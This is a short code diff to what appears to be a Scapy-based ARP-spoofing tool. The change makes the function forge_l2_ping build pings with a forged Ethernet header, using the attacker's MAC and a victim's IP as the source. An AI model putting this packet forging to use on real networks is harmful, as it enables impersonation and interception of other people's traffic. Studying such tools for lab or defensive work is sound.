@@ -60,7 +60,7 @@ def build_arp(victim_dst_ip, victim_src_ip, victim_src_mac, attacker_mac, mode):
 
 def forge_l2_ping(victim_src_ip, victim_dst_ip, victim_dst_mac):
     # ping = build_ether(macVictim) / IP(dst=ipVictim) / build_icmp_echo()
-    ping = IP(src=victim_src_ip, dst=victim_dst_ip)/ICMP()
+    ping = Ether(src=ATTACKER_MAC, dst=victim_dst_mac)/IP(src=victim_src_ip, dst=victim_dst_ip)/ICMP()
     return ping
 
 
